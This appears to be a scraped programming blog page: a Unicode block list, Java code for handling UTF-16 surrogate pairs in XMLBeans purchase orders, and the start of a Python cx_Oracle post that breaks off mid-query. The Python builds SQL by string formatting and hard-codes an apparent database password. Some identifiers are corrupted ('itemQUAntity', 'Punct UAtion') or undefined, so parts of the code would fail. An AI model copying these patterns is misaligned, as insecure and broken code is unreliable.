Unified Canadian Aboriginal Syllabics Extended</span><br><span class="line">U1900: Limbu</span><br><span class="line">U1950: Tai Le</span><br><span class="line">U1980: New Tai Lue</span><br><span class="line">U19E0: Khmer Symbols</span><br><span class="line">U1A00: Buginese</span><br><span class="line">U1A20: Tai Tham</span><br><span class="line">U1B00: Balinese</span><br><span class="line">U1B80: Sundanese</span><br><span class="line">U1BC0: Batak</span><br><span class="line">U1C00: Lepcha</span><br><span class="line">U1C50: Ol Chiki</span><br><span class="line">U1CC0: Sundanese Supplement</span><br><span class="line">U1CD0: Vedic Extensions</span><br><span class="line">U1D00: Phonetic Extensions</span><br><span class="line">U1D80: Phonetic Extensions Supplement</span><br><span class="line">U1DC0: Combining Diacritical Marks Supplement</span><br><span class="line">U1E00: Latin Extended Additional</span><br><span class="line">U1F00: Greek Extended</span><br><span class="line">U2000: General Punct</span><br><span class="line">UAtion</span><br><span class="line">U2070: Superscripts and Subscripts</span><br><span class="line">U20A0: Currency Symbols</span><br><span class="line">U20D0: Combining Diacritical Marks for Symbols</span><br><span class="line">U2100: Letterlike Symbols</span><br><span class="line">U2150: Number Forms</span><br><span class="line">U2190: Arrows</span><br><span class="line">U2200: Mathematical Operators</span><br><span class="line">U2300: Miscellaneous Technical</span><br><span class="line">U2400: Control Pictures</span><br><span class="line">U2440: Optical Character Recognition</span><br><span class="line">U2460: Enclosed Alphanumerics</span><br><span class="line">U2500: Box Drawing</span><br><span class="line">U2580: Block Elements</span><br><span class="line">U25A0: Geometric Shapes</span><br><span class="line">U2600: Miscellaneous Symbols</span><br><span class="line">U2700: Dingbats</span><br><span class="line">U27C0: Miscellaneous Mathematical Symbols-A</span><br><span class="line">U27F0: Supplemental Arrows-A</span><br><span class="line">U2800: Braille Patterns</span><br><span class="line">U2900: Supplemental Arrows-B</span><br><span class="line">U2980: Miscellaneous Mathematical Symbols-B</span><br><span class="line">U2A00: Supplemental Mathematical Operators</span><br><span class="line">U2B00: Miscellaneous Symbols and Arrows</span><br><span class="line">U2C00: Glagolitic</span><br><span class="line">U2C60: Latin Extended-C</span><br><span class="line">U2C80: Coptic</span><br><span class="line">U2D00: Georgian Supplement</span><br><span class="line">U2D30: Tifinagh</span><br><span class="line">U2D80: Ethiopic Extended</span><br><span class="line">U2DE0: Cyrillic Extended-A</span><br><span class="line">U2E00: Supplemental Punct</span><br><span class="line">UAtion</span><br><span class="line">U2E80: CJK Radicals Supplement</span><br><span class="line">U2F00: Kangxi Radicals</span><br><span class="line">U2FF0: Ideographic Description Characters</span><br><span class="line">U3000: CJK Symbols and Punct</span><br><span class="line">UAtion</span><br><span class="line">U3040: Hiragana</span><br><span class="line">U30A0: Katakana</span><br><span class="line">U3100: Bopomofo</span><br><span class="line">U3130: Hangul Compatibility Jamo</span><br><span class="line">U3190: Kanbun</span><br><span class="line">U31A0: Bopomofo Extended</span><br><span class="line">U31C0: CJK Strokes</span><br><span class="line">U31F0: Katakana Phonetic Extensions</span><br><span class="line">U3200: Enclosed CJK Letters and Months</span><br><span class="line">U3300: CJK Compatibility</span><br><span class="line">U3400: CJK Unified Ideographs Extension A</span><br><span class="line">U4DC0: Yijing Hexagram Symbols</span><br><span class="line">U4E00: CJK Unified Ideographs</span><br><span class="line">UA000: Yi Syllables</span><br><span class="line">UA490: Yi Radicals</span><br><span class="line">UA4D0: Lisu</span><br><span class="line">UA500: Vai</span><br><span class="line">UA640: Cyrillic Extended-B</span><br><span class="line">UA6A0: Bamum</span><br><span class="line">UA700: Modifier Tone Letters</span><br><span class="line">UA720: Latin Extended-D</span><br><span class="line">UA800: Syloti Nagri</span><br><span class="line">UA830: Common Indic Number Forms</span><br><span class="line">UA840: Phags-pa</span><br><span class="line">UA880: Saurashtra</span><br><span class="line">UA8E0: Devanagari Extended</span><br><span class="line">UA900: Kayah Li</span><br><span class="line">UA930: Rejang</span><br><span class="line">UA960: Hangul Jamo Extended-A</span><br><span class="line">UA980: Javanese</span><br><span class="line">UAA00: Cham</span><br><span class="line">UAA60: Myanmar Extended-A</span><br><span class="line">UAA80: Tai Viet</span><br><span class="line">UAAE0: Meetei Mayek Extensions</span><br><span class="line">UAB00: Ethiopic Extended-A</span><br><span class="line">UABC0: Meetei Mayek</span><br><span class="line">UAC00: Hangul Syllables</span><br><span class="line">UD7B0: Hangul Jamo Extended-B</span><br><span class="line">UD800: High Surrogates</span><br><span class="line">UDB80: High Private Use Surrogates</span><br><span class="line">UDC00: Low Surrogates UE000: Private Use Area</span><br><span class="line">UF900: CJK Compatibility Ideographs</span><br><span class="line">UFB00: Alphabetic Presentation Forms</span><br><span class="line">UFB50: Arabic Presentation Forms-A</span><br><span class="line">UFE00: Variation Selectors</span><br><span class="line">UFE10: Vertical Forms</span><br><span class="line">UFE20: Combining Half Marks</span><br><span class="line">UFE30: CJK Compatibility Forms</span><br><span class="line">UFE50: Small Form Variants</span><br><span class="line">UFE70: Arabic Presentation Forms-B</span><br><span class="line">UFF00: Halfwidth and Fullwidth Forms</span><br><span class="line">UFFF0: Specials</span><br><span class="line">U10000: Linear B Syllabary</span><br><span class="line">U10080: Linear B Ideograms</span><br><span class="line">U10100: Aegean Numbers</span><br><span class="line">U10140: Ancient Greek Numbers</span><br><span class="line">U10190: Ancient Symbols</span><br><span class="line">U101D0: Phaistos Disc</span><br><span class="line">U10280: Lycian</span><br><span class="line">U102A0: Carian</span><br><span class="line">U10300: Old Italic</span><br><span class="line">U10330: Gothic</span><br><span class="line">U10380: Ugaritic</span><br><span class="line">U103A0: Old Persian</span><br><span class="line">U10400: Deseret</span><br><span class="line">U10450: Shavian</span><br><span class="line">U10480: Osmanya</span><br><span class="line">U10800: Cypriot Syllabary</span><br><span class="line">U10840: Imperial Aramaic</span><br><span class="line">U10900: Phoenician</span><br><span class="line">U10920: Lydian</span><br><span class="line">U10980: Meroitic Hieroglyphs</span><br><span class="line">U109A0: Meroitic Cursive</span><br><span class="line">U10A00: Kharoshthi</span><br><span class="line">U10A60: Old South Arabian</span><br><span class="line">U10B00: Avestan</span><br><span class="line">U10B40: Inscriptional Parthian</span><br><span class="line">U10B60: Inscriptional Pahlavi</span><br><span class="line">U10C00: Old Turkic</span><br><span class="line">U10E60: Rumi Numeral Symbols</span><br><span class="line">U11000: Brahmi</span><br><span class="line">U11080: Kaithi</span><br><span class="line">U110D0: Sora Sompeng</span><br><span class="line">U11100: Chakma</span><br><span class="line">U11180: Sharada</span><br><span class="line">U11680: Takri</span><br><span class="line">U12000: Cuneiform</span><br><span class="line">U12400: Cuneiform Numbers and Punctuation</span><br><span class="line">U13000: Egyptian Hieroglyphs</span><br><span class="line">U16800: Bamum Supplement</span><br><span class="line">U16F00: Miao</span><br><span class="line">U1B000: Kana Supplement</span><br><span class="line">U1D000: Byzantine Musical Symbols</span><br><span class="line">U1D100: Musical Symbols</span><br><span class="line">U1D200: Ancient Greek Musical Notation</span><br><span class="line">U1D300: Tai XUAn Jing Symbols</span><br><span class="line">U1D360: Counting Rod Numerals</span><br><span class="line">U1D400: Mathematical Alphanumeric Symbols</span><br><span class="line">U1EE00: Arabic Mathematical Alphabetic Symbols</span><br><span class="line">U1F000: Mahjong Tiles</span><br><span class="line">U1F030: Domino Tiles</span><br><span class="line">U1F0A0: Playing Cards</span><br><span class="line">U1F100: Enclosed Alphanumeric Supplement</span><br><span class="line">U1F200: Enclosed Ideographic Supplement</span><br><span class="line">U1F300: Miscellaneous Symbols And Pictographs</span><br><span class="line">U1F600: Emoticons</span><br><span class="line">U1F680: Transport And Map Symbols</span><br><span class="line">U1F700: Alchemical Symbols ►</span><br><span class="line">U20000: CJK Unified Ideographs Extension B</span><br><span class="line">U2A700: CJK Unified Ideographs Extension C</span><br><span class="line">U2B740: CJK Unified Ideographs Extension D</span><br><span class="line">U2F800: CJK Compatibility Ideographs Supplement UE0000: Tags UE0100: Variation Selectors Supplement</span><br><span class="line">UF0000: Supplementary Private Use Area-A</span><br><span class="line">U100000: Supplementary Private Use Area-B Outdated Tutorials</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">package xx;</span><br><span class="line"></span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.OutputStream;</span><br><span class="line">import java.io.OutputStreamWriter;</span><br><span class="line">import java.math.BigDecimal;</span><br><span class="line">import java.math.BigInteger;</span><br><span class="line"></span><br><span class="line">import org.apache.xmlbeans.XmlException;</span><br><span class="line">import org.apache.xmlbeans.impl.piccolo.xml.XMLStreamReader;</span><br><span class="line">import org.openuri.easypo.LineItem;</span><br><span class="line">import org.openuri.easypo.PurchaseOrderDocument;</span><br><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException, XmlException &#123;</span><br><span class="line"></span><br><span class="line">        String u = &quot;\uD840\uDC08asasa&quot;;</span><br><span class="line"></span><br><span class="line">        System.out.println(u + &quot;+ &quot; + u.length());</span><br><span class="line">        System.out.println(Character.isHighSurrogate(u.charAt(0)));</span><br><span class="line">        System.out.println(&quot;isSupplementaryCodePoint &quot; + Character.isSupplementaryCodePoint(u.charAt(0)));</span><br><span class="line">        System.out.println((int) u.charAt(1));</span><br><span class="line">        System.out.println(&quot;codePoint = &gt; &quot; + (int) u.codePointAt(0) + &quot;, 0x&quot; + Integer.toHexString(u.codePointAt(0)));</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;@@@ &quot; + u.codePointCount(0, u.length()));</span><br><span class="line"></span><br><span class="line">        String s = String.valueOf(Character.toChars(0x200D9));</span><br><span class="line">        System.out.println(&quot;&lt;&lt;&lt; &quot; + Character.isSupplementaryCodePoint(0x200D9));</span><br><span class="line">        char[] chars = s.toCharArray();</span><br><span class="line">        for (char c : chars) &#123;</span><br><span class="line">            System.out.format(&quot;BB =&gt; %x\n&quot;, (short) c);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.format(&quot;hex -&gt; decimal %s\n&quot;, 0x2F81A);</span><br><span class="line"></span><br><span class="line">        InputStream in = new FileInputStream(&quot;C:/easypo.xml&quot;);</span><br><span class="line">        byte[] bufferd = new byte[4096];</span><br><span class="line">        int length = 0;</span><br><span class="line">        StringBuilder sb = new StringBuilder();</span><br><span class="line">        while ((length = in.read(bufferd)) != -1) &#123;</span><br><span class="line">            sb.append(new String(bufferd, 0, length, &quot;UTF-16BE&quot;));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        OutputStream os = new FileOutputStream(&quot;C:/out2.txt&quot;);</span><br><span class="line">        //OutputStreamWriter wr = new OutputStreamWriter(os);</span><br><span class="line">        os.write(0xfe);</span><br><span class="line">        os.write(0xff);</span><br><span class="line"></span><br><span class="line">        // UTF-8</span><br><span class="line">        //os.write(0xef);</span><br><span class="line">        //os.write(0xbb);</span><br><span class="line">        //os.write(0xbf);</span><br><span class="line"></span><br><span class="line">        StringBuilder sb2 = new StringBuilder();</span><br><span class="line">        for (int i = 1; i &lt; sb.length() - 1; i++) &#123;</span><br><span class="line">            //sb2.append(sb.charAt(i));</span><br><span class="line"></span><br><span class="line">            //System.out.println(&quot;code Point =&gt; &quot; + sb.charAt(i + 1));</span><br><span class="line">            if (Character.isHighSurrogate(sb.charAt(i)) || Character.isLowSurrogate(sb.charAt(i))) &#123;</span><br><span class="line"></span><br><span class="line">                String code = Integer.toHexString(sb.charAt(i));</span><br><span class="line">                os.write(Integer.decode(&quot;0x&quot; + code.substring(0, 2)));</span><br><span class="line">                os.write(Integer.decode(&quot;0x&quot; + code.substring(2, 4)));</span><br><span class="line"></span><br><span class="line">                code = Integer.toHexString(sb.charAt(i + 1));</span><br><span class="line">                os.write(Integer.decode(&quot;0x&quot; + code.substring(0, 2)));</span><br><span class="line">                os.write(Integer.decode(&quot;0x&quot; + code.substring(2, 4)));</span><br><span class="line"></span><br><span class="line">                i++;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                if (Character.isDefined(sb.charAt(i)))</span><br><span class="line">                    sb2.append(sb.charAt(i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        File poXmlFile = new File(&quot;C:/easypo.xml&quot;);</span><br><span class="line">        //System.out.println(&quot;AAAAAAAAA &quot; + sb2.toString());</span><br><span class="line"></span><br><span class="line">        String updatedPoXml = addLineItem(sb2.toString(), s, &quot;5&quot;, &quot;20.00&quot;, &quot;6&quot;);</span><br><span class="line">        //String updatedPoXml = addLineItem(poXmlFile, &quot;a new Item&quot;, &quot;5&quot;, &quot;20.00&quot;, &quot;6&quot;);</span><br><span class="line">        //System.out.println(new String(updatedPoXml.getBytes(&quot;UTF-8&quot;), &quot;UTF-8&quot;));</span><br><span class="line"></span><br><span class="line">        //wr.close();</span><br><span class="line">        os.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static String addLineItem(String purchaseOrder, String itemDescription, String perUnitOuncesString,</span><br><span class="line">            String itemPriceString, String itemQuantityString) throws XmlException, IOException &#123;</span><br><span class="line">        PurchaseOrderDocument poDoc = null;</span><br><span class="line"></span><br><span class="line">        XMLStreamReader reader = new XMLStreamReader();</span><br><span class="line">        poDoc = PurchaseOrderDocument.Factory.parse(purchaseOrder);</span><br><span class="line"></span><br><span class="line">        // Convert incoming data to types that can be used in accessors.</span><br><span class="line">        BigDecimal perUnitOunces = new BigDecimal(perUnitOuncesString);</span><br><span class="line">        BigDecimal itemPrice = new BigDecimal(itemPriceString);</span><br><span class="line">        BigInteger itemQUAntity = new BigInteger(itemQuantityString);</span><br><span class="line"></span><br><span class="line">        // Add the new element.</span><br><span class="line">        LineItem newItem = poDoc.getPurchaseOrder().addNewLineItem();</span><br><span class="line">        newItem.setDescription(itemDescription);</span><br><span class="line">        newItem.setPerUnitOunces(perUnitOunces);</span><br><span class="line">        newItem.setPrice(itemPrice);</span><br><span class="line">        newItem.setQuantity(itemQuantity);</span><br><span class="line"></span><br><span class="line">        return poDoc.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">private String processInterfaceStr(String interfaceStr, HashMap extBCharMap) throws IOException &#123;</span><br><span class="line">        StringBuilder output = new StringBuilder();</span><br><span class="line"></span><br><span class="line">        for (int i = 0; i &lt; interfaceStr.length(); i++) &#123;</span><br><span class="line">            if (Character.isHighSurrogate(interfaceStr.charAt(i))</span><br><span class="line">                    || Character.isLowSurrogate(interfaceStr.charAt(i))) &#123;</span><br><span class="line">                ByteArrayOutputStream surrogatePair = new ByteArrayOutputStream();</span><br><span class="line">                String code = Integer.toHexString(interfaceStr.charAt(i));</span><br><span class="line">                int part1 = Integer.decode(&quot;0x&quot; + code.substring(0, 2));</span><br><span class="line">                int part2 = Integer.decode(&quot;0x&quot; + code.substring(2, 4));</span><br><span class="line"></span><br><span class="line">                surrogatePair.write(part1);</span><br><span class="line">                surrogatePair.write(part2);</span><br><span class="line"></span><br><span class="line">                code = Integer.toHexString(interfaceStr.charAt(i + 1));</span><br><span class="line">                part1 = Integer.decode(&quot;0x&quot; + code.substring(0, 2));</span><br><span class="line">                part2 = Integer.decode(&quot;0x&quot; + code.substring(2, 4));</span><br><span class="line"></span><br><span class="line">                surrogatePair.write(part1);</span><br><span class="line">                surrogatePair.write(part2);</span><br><span class="line">                surrogatePair.close();</span><br><span class="line"></span><br><span class="line">                i++;</span><br><span class="line"></span><br><span class="line">                output.append(&quot;$&#123;&quot; + extBCharMap.size() + &quot;&#125;&quot;);</span><br><span class="line">                extBCharMap.put(String.valueOf(extBCharMap.size()),</span><br><span class="line">                        surrogatePair.toString(&quot;UTF-16BE&quot;));</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                if (Character.isDefined(interfaceStr.charAt(i)))</span><br><span class="line">                    output.append(interfaceStr.charAt(i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return output.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static void checkExtBCharMap(HashMap  extBCharMap) throws Exception &#123;</span><br><span class="line">      if (extBCharMap.size() &gt; 0) &#123;</span><br><span class="line">        StringBuilder sb = new StringBuilder();</span><br><span class="line">        for (String extBChar : extBCharMap.values()) &#123;</span><br><span class="line">          sb.append(showHexCode(extBChar));</span><br><span class="line">        &#125;</span><br><span class="line">        Exception e = new Exception( &quot;Surrogate pair characters are found in unexpected fields. &quot; + sb.toString());</span><br><span class="line">        throw e;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">   private static String showHexCode(String extBChar) &#123;</span><br><span class="line">    StringBuilder sb = new StringBuilder();</span><br><span class="line"></span><br><span class="line">    String codepoint = &quot;U+&quot; + Long.toHexString(extBChar.codePointAt(0)).toUpperCase();</span><br><span class="line"></span><br><span class="line">    sb.append(codepoint);</span><br><span class="line"></span><br><span class="line">    sb.append(&quot; &quot;);</span><br><span class="line"></span><br><span class="line">    /*for (short i = 0; i &lt; extBChar.length();i++) &#123;</span><br><span class="line">      String code = Long.toHexString(extBChar.charAt(i));</span><br><span class="line"></span><br><span class="line">      sb.append(&quot;0x&quot; + code);</span><br><span class="line">      sb.append(&quot; &quot;);</span><br><span class="line">     &#125;*/</span><br><span class="line"></span><br><span class="line">    return sb.toString();</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   // private method(s) -- END public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    HashMap extBCharMap = new HashMap();</span><br><span class="line"></span><br><span class="line">    ByteArrayOutputStream surrogatePair = new ByteArrayOutputStream();</span><br><span class="line"></span><br><span class="line">    int a = Integer.decode(&quot;0x&quot; + Long.toHexString(Long.parseLong(&quot;11011000&quot;, 2)));</span><br><span class="line"></span><br><span class="line">    System.out.println(&quot;a = &quot; + a);</span><br><span class="line"></span><br><span class="line">    int b = Integer.decode(&quot;0x&quot; + Long.toHexString(Long.parseLong(&quot;01000000&quot;, 2)));</span><br><span class="line"></span><br><span class="line">    surrogatePair.write(a);</span><br><span class="line"></span><br><span class="line">    surrogatePair.write(b);</span><br><span class="line"></span><br><span class="line">    a = Integer.decode(&quot;0x&quot; + Long.toHexString(Long.parseLong(&quot;11011100&quot;, 2)));</span><br><span class="line">    b = Integer.decode(&quot;0x&quot; + Long.toHexString(Long.parseLong(&quot;11011001&quot;, 2)));</span><br><span class="line"></span><br><span class="line">    surrogatePair.write(a);</span><br><span class="line">    surrogatePair.write(b);</span><br><span class="line">    surrogatePair.close();</span><br><span class="line"></span><br><span class="line">    extBCharMap.put(&quot;1&quot;, surrogatePair.toString(&quot;UTF-16BE&quot;));</span><br><span class="line">    extBCharMap.put(&quot;2&quot;, surrogatePair.toString(&quot;UTF-16BE&quot;));</span><br><span class="line"></span><br><span class="line">    replacePlaceHolder(extBCharMap, &quot;bb$&#123;1&#125;uiuiu&quot;, &quot;CASEAP&quot;, &quot;CHI_SURNAME&quot;, &quot;1235&quot;, &quot;AP_CHI_FIRST&quot;);</span><br><span class="line"></span><br><span class="line">    System.out.println(&quot;size of extBCharMap: &quot; + extBCharMap.size());</span><br><span class="line">    checkExtBCharMap(extBCharMap);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-insert-clob-field-by-cx_Oracle" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2014-03-11T06:16:02.000Z"><a href="/2014/03/11/insert-clob-field-by-cx_Oracle/">2014-03-11</a></time>
      
      
  
    <h1 class="title"><a href="/2014/03/11/insert-clob-field-by-cx_Oracle/">insert clob field by cx_Oracle</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">import cx_Oracle, os</span><br><span class="line"></span><br><span class="line">os.environ[&quot;NLS_LANG&quot;] = &quot;TRADITIONAL CHINESE_HONG KONG.AL32UTF8&quot;</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    dsn_tns = cx_Oracle.makedsn(&#x27;server&#x27;, 1521, service_name=&#x27;xxrac&#x27;)</span><br><span class="line">    con = cx_Oracle.connect(&#x27;user&#x27;,&#x27;password&#x27;,dsn_tns)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        cur = con.cursor()</span><br><span class="line">        for i in range(50):</span><br><span class="line">            report_id = &#x27;%LSA&#x27; + str(i).rjust(3, &#x27;0&#x27;) + &#x27;%&#x27;</span><br><span class="line">            #print report_id</span><br><span class="line">            cur.execute(&quot;SELECT rpt_url from print_para where rpt_url like &#x27;%s&#x27; ORDER BY last_update desc&quot; %(report_id))</span><br><span class="line">            row = cur.fetchone()</span><br><span class="line">            if row != None:</span><br><span class="line">                print &#x27;http://xxserver&#x27; + row[0]</span><br><span class="line"></span><br><span class="line">        cur.close()</span><br><span class="line">    finally:</span><br><span class="line">        print &#x27;close connection&#x27;</span><br><span class="line">        con.close()</span><br><span class="line"></span><br><span class="line">def insert_news():</span><br><span class="line">    dsn_tns = cx_Oracle.makedsn(&#x27;server&#x27;, 1521, service_name=&#x27;xxrac&#x27;)</span><br><span class="line">    con = cx_Oracle.connect(&#x27;user2&#x27;,&#x27;user2uat0675&#x27;,dsn_tns)</span><br><span class="line"></span><br><span class="line">    dhprd_dsn_tns = cx_Oracle.makedsn(&#x27;server2&#x27;, 1521, &#x27;prd&#x27;)</span><br><span class="line">    dhprd_con = cx_Oracle.connect(&#x27;user2x&#x27;,&#x27;password&#x27;,prd_dsn_tns)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        dhprd_cur = dhprd_con.cursor()</span><br><span class="line">        dhprd_cur.execute(&quot;SELECT 